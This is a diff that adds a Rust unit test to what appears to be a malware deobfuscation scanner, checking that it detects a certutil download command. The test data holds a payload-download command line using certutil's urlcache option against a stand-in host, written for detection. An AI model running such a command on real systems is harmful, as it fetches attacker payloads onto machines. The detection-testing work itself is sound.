@@ -14529,6 +14529,27 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
             env.traits
         );
     }
+
+    #[test]
+    fn certutil_urlcache_schemeless_source_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp -urlcache -split -f cert-schemeless-deob.example/payload.exe C:\Temp\payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "http://cert-schemeless-deob.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "schemeless certutil deob-text source was not structured: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
